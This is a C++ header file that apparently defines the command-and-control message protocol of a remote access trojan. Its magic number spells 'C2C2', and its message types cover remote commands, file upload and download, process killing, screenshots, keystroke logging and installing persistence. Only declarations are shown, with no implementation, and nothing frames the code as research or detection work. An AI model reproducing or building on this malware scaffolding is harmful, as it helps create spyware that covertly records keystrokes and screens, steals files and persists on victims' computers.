#pragma once
#include <string>
#include <vector>
#include <cstdint>


enum class MessageType : uint8_t {
    
    HEARTBEAT = 0x01,
    REGISTER = 0x02,
    COMMAND = 0x03,
    RESPONSE = 0x04,

    
    FILE_UPLOAD = 0x10,
    FILE_DOWNLOAD = 0x11,
    FILE_LIST = 0x12,

    
    SYSTEM_INFO = 0x20,
    PROCESS_LIST = 0x21,
    PROCESS_KILL = 0x22,

    
    SCREENSHOT = 0x30,
    KEYLOG_START = 0x31,
    KEYLOG_STOP = 0x32,
    KEYLOG_DATA = 0x33,

    
    PERSISTENCE_INSTALL = 0x40,
    PERSISTENCE_REMOVE = 0x41,

    
    ERROR_MSG = 0xFF
};


#pragma pack(push, 1)
struct MessageHeader {
    uint32_t magic;          
    uint32_t length;         
    MessageType type;        
    uint8_t encrypted;       
    uint16_t checksum;       
};
#pragma pack(pop)


class Protocol {
public:
    static const uint32_t MAGIC_NUMBER = 0x43324332;
    static const size_t MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB

    
    static std::vector<uint8_t> CreateMessage(MessageType type, const std::vector<uint8_t>& data, bool encrypt = false);

    
    static bool ParseMessage(const std::vector<uint8_t>& buffer, MessageHeader& header, std::vector<uint8_t>& data);

    
    static uint16_t CalculateChecksum(const uint8_t* data, size_t length);

    
    static void SerializeString(std::vector<uint8_t>& buffer, const std::string& str);

    
    static std::string DeserializeString(const uint8_t*& ptr, size_t& remaining);
};
